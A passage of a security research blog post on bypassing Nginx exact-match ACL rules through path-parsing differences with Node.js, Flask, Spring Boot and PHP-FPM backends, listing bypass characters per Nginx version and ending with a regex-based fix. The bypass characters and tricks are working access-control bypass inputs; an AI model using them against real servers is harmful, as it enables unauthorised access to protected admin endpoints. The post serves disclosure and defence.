48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><pre><code class="lang-plaintext">location = /admin {
    deny all;
}

location = /admin/ {
    deny all;
}
</code></pre></div></div>
<div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><pre><code class="lang-javascript">app.get(<span class="hljs-string">'/admin'</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
    <span class="hljs-keyword">return</span> res.send(<span class="hljs-string">'ADMIN'</span>);
});
</code></pre></div></div>
<p>Following the <code>trim()</code> logic, Node.js "ignores" the characters <code>\x09</code>, <code>\xa0</code>, and <code>\x0c</code> from the pathname, but Nginx considers them as part of the URL:</p>
<p><img loading="lazy" src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/0531fc1a-9599-4a00-aa94-21cca2db557c.png" alt="" class="image--center mx-auto"></p>
<ul>
<li><p>First, Nginx receives the HTTP request and performs path normalization on the pathname;</p>
</li>
<li><p>As Nginx includes the character <code>\xa0</code> as part of the pathname, the ACL rule for the <code>/admin</code> URI will not be triggered. Consequently, Nginx will forward the HTTP message to the backend;</p>
</li>
<li><p>When the URI <code>/admin\x0a</code> is received by the Node.js server, the character <code>\xa0</code> will be removed, allowing successful retrieval of the <code>/admin</code> endpoint.</p>
</li>
</ul>
<p>Below is a graphical demonstration of what happens with the HTTP request:</p>
<p><img loading="lazy" src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/84ec1c49-2df9-4a44-ab01-1d798ef0564f.png" alt="" class="image--center mx-auto"></p>
<p>To gain a clearer understanding of how this vulnerability can be exploited, I recommend watching the accompanying proof of concept video below:</p>
<div class="embed-wrapper"><div class="webembed-wrapper" style="position: relative;overflow: hidden; padding-top: 56.17977528089888%;"><iframe width="100%" height="100%" src="https://www.youtube.com/embed/sgs3s5oTfz8?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="" title="Nginx + Node.js Path Manipulation" style="position: absolute; top: 0; left: 0; border: 0;" class="webembed-iframe"></div></iframe></div></div>
<p> </p>
<p>Below is a table correlating Nginx versions with characters that can potentially lead to bypassing URI ACL rules when using Node.js as the backend:</p>
<div class="hn-table">
<table>
<thead>
<tr>
<td>Nginx Version</td><td><strong>Node.js Bypass Characters</strong></td></tr>
</thead>
<tbody>
<tr>
<td>1.22.0</td><td><code>\xA0</code></td></tr>
<tr>
<td>1.21.6</td><td><code>\xA0</code></td></tr>
<tr>
<td>1.20.2</td><td><code>\xA0</code>, <code>\x09</code>, <code>\x0C</code></td></tr>
<tr>
<td>1.18.0</td><td><code>\xA0</code>, <code>\x09</code>, <code>\x0C</code></td></tr>
<tr>
<td>1.16.1</td><td><code>\xA0</code>, <code>\x09</code>, <code>\x0C</code></td></tr>
</tbody>
</table>
</div><h2 id="heading-bypassing-nginx-acl-rules-with-flask" class="permalink-heading"><a class="permalink-heading-button" title="Permalink" href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-bypassing-nginx-acl-rules-with-flask" data-clipboard-text="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-bypassing-nginx-acl-rules-with-flask" style="height: 40px;"><span class="hidden">Permalink</span><svg class="h-4 w-4 fill-current dark:text-white" viewBox="0 0 512 512"><path d="M301.148 394.702l-79.2 79.19c-50.778 50.799-133.037 50.824-183.84 0-50.799-50.778-50.824-133.037 0-183.84l79.19-79.2a132.833 132.833 0 013.532-3.403c7.55-7.005 19.795-2.004 20.208 8.286.193 4.807.598 9.607 1.216 14.384.481 3.717-.746 7.447-3.397 10.096-16.48 16.469-75.142 75.128-75.3 75.286-36.738 36.759-36.731 96.188 0 132.94 36.759 36.738 96.188 36.731 132.94 0l79.2-79.2.36-.36c36.301-36.672 36.14-96.07-.37-132.58-8.214-8.214-17.577-14.58-27.585-19.109-4.566-2.066-7.426-6.667-7.134-11.67a62.197 62.197 0 012.826-15.259c2.103-6.601 9.531-9.961 15.919-7.28 15.073 6.324 29.187 15.62 41.435 27.868 50.688 50.689 50.679 133.17 0 183.851zm-90.296-93.554c12.248 12.248 26.362 21.544 41.435 27.868 6.388 2.68 13.816-.68 15.919-7.28a62.197 62.197 0 002.826-15.259c.292-5.003-2.569-9.604-7.134-11.67-10.008-4.528-19.371-10.894-27.585-19.109-36.51-36.51-36.671-95.908-.37-132.58l.36-.36 79.2-79.2c36.752-36.731 96.181-36.738 132.94 0 36.731 36.752 36.738 96.181 0 132.94-.157.157-58.819 58.817-75.3 75.286-2.651 2.65-3.878 6.379-3.397 10.096a163.156 163.156 0 011.216 14.384c.413 10.291 12.659 15.291 20.208 8.286a131.324 131.324 0 003.532-3.403l79.19-79.2c50.824-50.803 50.799-133.062 0-183.84-50.802-50.824-133.062-50.799-183.84 0l-79.2 79.19c-50.679 50.682-50.688 133.163 0 183.851z"></path></svg></a>Bypassing Nginx ACL Rules With Flask</h2>
<p>Flask removes the characters <code>\x85</code>, <code>\xA0</code>, <code>\x1F</code>, <code>\x1E</code>, <code>\x1D</code>, <code>\x1C</code>, <code>\x0C</code>, <code>\x0B</code>, and <code>\x09</code> from the URL path, but NGINX doesn't.</p>
<p>Take the following nginx configuration/API source code as a reference:</p>
<div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><pre><code class="lang-plaintext">location = /admin {
    deny all;
}

location = /admin/ {
    deny all;
}
</code></pre></div></div>
<div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><pre><code class="lang-python"><span class="hljs-meta">@app.route('/admin', methods = ['GET'])</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">admin</span>():</span>
    data = {<span class="hljs-string">"url"</span>:request.url, <span class="hljs-string">"admin"</span>:<span class="hljs-string">"True"</span>}

    <span class="hljs-keyword">return</span> Response(str(data), mimetype=<span class="hljs-string">"application/json"</span>)
</code></pre></div></div>
<p>As you can see below, it's possible to circumvent the ACL protection by adding the character <code>\x85</code> at the end of the pathname:</p>
<p><img loading="lazy" src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/4032be9b-c7f3-48ae-8074-5d9ad1f9e7a5.png" alt="" class="image--center mx-auto"></p>
<div class="hn-table">
<table>
<thead>
<tr>
<td>Nginx Version</td><td><strong>Flask Bypass Characters</strong></td></tr>
</thead>
<tbody>
<tr>
<td>1.22.0</td><td><code>\x85</code>, <code>\xA0</code></td></tr>
<tr>
<td>1.21.6</td><td><code>\x85</code>, <code>\xA0</code></td></tr>
<tr>
<td>1.20.2</td><td><code>\x85</code>, <code>\xA0</code>, <code>\x1F</code>, <code>\x1E</code>, <code>\x1D</code>, <code>\x1C</code>, <code>\x0C</code>, <code>\x0B</code></td></tr>
<tr>
<td>1.18.0</td><td><code>\x85</code>, <code>\xA0</code>, <code>\x1F</code>, <code>\x1E</code>, <code>\x1D</code>, <code>\x1C</code>, <code>\x0C</code>, <code>\x0B</code></td></tr>
<tr>
<td>1.16.1</td><td><code>\x85</code>, <code>\xA0</code>, <code>\x1F</code>, <code>\x1E</code>, <code>\x1D</code>, <code>\x1C</code>, <code>\x0C</code>, <code>\x0B</code></td></tr>
</tbody>
</table>
</div><h2 id="heading-bypassing-nginx-acl-rules-with-spring-boot" class="permalink-heading"><a class="permalink-heading-button" title="Permalink" href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-bypassing-nginx-acl-rules-with-spring-boot" data-clipboard-text="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-bypassing-nginx-acl-rules-with-spring-boot" style="height: 40px;"><span class="hidden">Permalink</span><svg class="h-4 w-4 fill-current dark:text-white" viewBox="0 0 512 512"><path d="M301.148 394.702l-79.2 79.19c-50.778 50.799-133.037 50.824-183.84 0-50.799-50.778-50.824-133.037 0-183.84l79.19-79.2a132.833 132.833 0 013.532-3.403c7.55-7.005 19.795-2.004 20.208 8.286.193 4.807.598 9.607 1.216 14.384.481 3.717-.746 7.447-3.397 10.096-16.48 16.469-75.142 75.128-75.3 75.286-36.738 36.759-36.731 96.188 0 132.94 36.759 36.738 96.188 36.731 132.94 0l79.2-79.2.36-.36c36.301-36.672 36.14-96.07-.37-132.58-8.214-8.214-17.577-14.58-27.585-19.109-4.566-2.066-7.426-6.667-7.134-11.67a62.197 62.197 0 012.826-15.259c2.103-6.601 9.531-9.961 15.919-7.28 15.073 6.324 29.187 15.62 41.435 27.868 50.688 50.689 50.679 133.17 0 183.851zm-90.296-93.554c12.248 12.248 26.362 21.544 41.435 27.868 6.388 2.68 13.816-.68 15.919-7.28a62.197 62.197 0 002.826-15.259c.292-5.003-2.569-9.604-7.134-11.67-10.008-4.528-19.371-10.894-27.585-19.109-36.51-36.51-36.671-95.908-.37-132.58l.36-.36 79.2-79.2c36.752-36.731 96.181-36.738 132.94 0 36.731 36.752 36.738 96.181 0 132.94-.157.157-58.819 58.817-75.3 75.286-2.651 2.65-3.878 6.379-3.397 10.096a163.156 163.156 0 011.216 14.384c.413 10.291 12.659 15.291 20.208 8.286a131.324 131.324 0 003.532-3.403l79.19-79.2c50.824-50.803 50.799-133.062 0-183.84-50.802-50.824-133.062-50.799-183.84 0l-79.2 79.19c-50.679 50.682-50.688 133.163 0 183.851z"></path></svg></a>Bypassing Nginx ACL Rules With Spring Boot</h2>
<p>Spring removes the characters <code>\x09</code> and <code>\x3B</code> from the URL path, but Nginx doesn't.</p>
<p>Take the following Nginx configuration/API source code as a reference:</p>
<div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><pre><code class="lang-plaintext">location = /admin {
    deny all;
}

location = /admin/ {
    deny all;
}
</code></pre></div></div>
<div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><pre><code class="lang-java"><span class="hljs-meta">@GetMapping("/admin")</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">admin</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">return</span> <span class="hljs-string">"Greetings from Spring Boot!"</span>;
}
</code></pre></div></div>
<p>Below, you will find a demonstration of how ACL protection can be circumvented by adding the character <code>\x09</code> or <code>\t</code> at the end of the pathname:</p>
<p><img loading="lazy" src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/b3f91ea3-558f-4889-860c-15cdc02cb7f6.png" alt="" class="image--center mx-auto"></p>
<div class="hn-table">
<table>
<thead>
<tr>
<td>Nginx Version</td><td><strong>Spring Boot Bypass Characters</strong></td></tr>
</thead>
<tbody>
<tr>
<td>1.22.0</td><td><code>;</code></td></tr>
<tr>
<td>1.21.6</td><td><code>;</code></td></tr>
<tr>
<td>1.20.2</td><td><code>\x09</code>, <code>;</code></td></tr>
<tr>
<td>1.18.0</td><td><code>\x09</code>, <code>;</code></td></tr>
<tr>
<td>1.16.1</td><td><code>\x09</code>, <code>;</code></td></tr>
</tbody>
</table>
</div><h2 id="heading-bypassing-nginx-acl-rules-with-php-fpm-integration" class="permalink-heading"><a class="permalink-heading-button" title="Permalink" href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-bypassing-nginx-acl-rules-with-php-fpm-integration" data-clipboard-text="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-bypassing-nginx-acl-rules-with-php-fpm-integration" style="height: 40px;"><span class="hidden">Permalink</span><svg class="h-4 w-4 fill-current dark:text-white" viewBox="0 0 512 512"><path d="M301.148 394.702l-79.2 79.19c-50.778 50.799-133.037 50.824-183.84 0-50.799-50.778-50.824-133.037 0-183.84l79.19-79.2a132.833 132.833 0 013.532-3.403c7.55-7.005 19.795-2.004 20.208 8.286.193 4.807.598 9.607 1.216 14.384.481 3.717-.746 7.447-3.397 10.096-16.48 16.469-75.142 75.128-75.3 75.286-36.738 36.759-36.731 96.188 0 132.94 36.759 36.738 96.188 36.731 132.94 0l79.2-79.2.36-.36c36.301-36.672 36.14-96.07-.37-132.58-8.214-8.214-17.577-14.58-27.585-19.109-4.566-2.066-7.426-6.667-7.134-11.67a62.197 62.197 0 012.826-15.259c2.103-6.601 9.531-9.961 15.919-7.28 15.073 6.324 29.187 15.62 41.435 27.868 50.688 50.689 50.679 133.17 0 183.851zm-90.296-93.554c12.248 12.248 26.362 21.544 41.435 27.868 6.388 2.68 13.816-.68 15.919-7.28a62.197 62.197 0 002.826-15.259c.292-5.003-2.569-9.604-7.134-11.67-10.008-4.528-19.371-10.894-27.585-19.109-36.51-36.51-36.671-95.908-.37-132.58l.36-.36 79.2-79.2c36.752-36.731 96.181-36.738 132.94 0 36.731 36.752 36.738 96.181 0 132.94-.157.157-58.819 58.817-75.3 75.286-2.651 2.65-3.878 6.379-3.397 10.096a163.156 163.156 0 011.216 14.384c.413 10.291 12.659 15.291 20.208 8.286a131.324 131.324 0 003.532-3.403l79.19-79.2c50.824-50.803 50.799-133.062 0-183.84-50.802-50.824-133.062-50.799-183.84 0l-79.2 79.19c-50.679 50.682-50.688 133.163 0 183.851z"></path></svg></a>Bypassing Nginx ACL Rules With PHP-FPM Integration</h2>
<p>PHP-FPM (FastCGI Process Manager) is a robust and high-performance PHP FastCGI implementation that works seamlessly with Nginx. It serves as a standalone server for handling PHP requests, improving the speed and efficiency of PHP execution. Nginx acts as a reverse proxy, receiving incoming HTTP requests and passing them to PHP-FPM for processing.</p>
<p>Let's consider the following Nginx FPM configuration:</p>
<div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><pre><code class="lang-plaintext">location = /admin.php {
    deny all;
}

location ~ \.php$ {
    include snippets/fastcgi-php.conf;
    fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
</code></pre></div></div>
<p>When two <code>.php</code> files are in the same pathname of the HTTP request, PHP will match the first one, ignoring everything after the slash. Since the Nginx is configured to block requests to the specific endpoint <code>/admin.php</code>, it's possible to access the admin.php file by doing the following request:</p>
<p><img loading="lazy" src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/66ac562a-7da9-4397-a76a-1d641474e000.png" alt="" class="image--center mx-auto"></p>
<p>Below is a graphical example of how the applications interpret the HTTP request:</p>
<p><img loading="lazy" src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/03073365-9dbf-4cf5-8762-1d705c9a038c.png" alt="" class="image--center mx-auto"></p>
<p>This technique only works if the second PHP file, in this case, <code>index.php</code>, exists in the server structure. Take the following server code/structure as a reference:</p>
<p><img loading="lazy" src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/d0708099-48e0-46d0-b646-8bb92c51454a.png" alt="" class="image--center mx-auto"></p>
<p>These behaviors were reported to the Nginx security team in 2022, and they responded by saying that they don't have responsibility for it.</p>
<p>Since the research concluded in April 2022, newer versions of Nginx were not specifically tested. However, it is highly likely that the findings and vulnerabilities identified in the research are reproducible in the latest version of Nginx as well.</p>
<h2 id="heading-how-to-prevent" class="permalink-heading"><a class="permalink-heading-button" title="Permalink" href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-how-to-prevent" data-clipboard-text="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-how-to-prevent" style="height: 40px;"><span class="hidden">Permalink</span><svg class="h-4 w-4 fill-current dark:text-white" viewBox="0 0 512 512"><path d="M301.148 394.702l-79.2 79.19c-50.778 50.799-133.037 50.824-183.84 0-50.799-50.778-50.824-133.037 0-183.84l79.19-79.2a132.833 132.833 0 013.532-3.403c7.55-7.005 19.795-2.004 20.208 8.286.193 4.807.598 9.607 1.216 14.384.481 3.717-.746 7.447-3.397 10.096-16.48 16.469-75.142 75.128-75.3 75.286-36.738 36.759-36.731 96.188 0 132.94 36.759 36.738 96.188 36.731 132.94 0l79.2-79.2.36-.36c36.301-36.672 36.14-96.07-.37-132.58-8.214-8.214-17.577-14.58-27.585-19.109-4.566-2.066-7.426-6.667-7.134-11.67a62.197 62.197 0 012.826-15.259c2.103-6.601 9.531-9.961 15.919-7.28 15.073 6.324 29.187 15.62 41.435 27.868 50.688 50.689 50.679 133.17 0 183.851zm-90.296-93.554c12.248 12.248 26.362 21.544 41.435 27.868 6.388 2.68 13.816-.68 15.919-7.28a62.197 62.197 0 002.826-15.259c.292-5.003-2.569-9.604-7.134-11.67-10.008-4.528-19.371-10.894-27.585-19.109-36.51-36.51-36.671-95.908-.37-132.58l.36-.36 79.2-79.2c36.752-36.731 96.181-36.738 132.94 0 36.731 36.752 36.738 96.181 0 132.94-.157.157-58.819 58.817-75.3 75.286-2.651 2.65-3.878 6.379-3.397 10.096a163.156 163.156 0 011.216 14.384c.413 10.291 12.659 15.291 20.208 8.286a131.324 131.324 0 003.532-3.403l79.19-79.2c50.824-50.803 50.799-133.062 0-183.84-50.802-50.824-133.062-50.799-183.84 0l-79.2 79.19c-50.679 50.682-50.688 133.163 0 183.851z"></path></svg></a>How to prevent</h2>
<p>To prevent these issues, you must use the <code>~</code> expression Instead of the <code>=</code> expression on Nginx ACL rules, for example:</p>
<div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><pre><code class="lang-plaintext">location ~* ^/admin {
    deny all;
}
</code></pre></div></div>
<p>The <code>~</code> expression matches the string <code>/admin</code> in any part of the pathname, in other words, if a user sent a request to <code>/admin1337</code>, the request will also be blocked.</p>
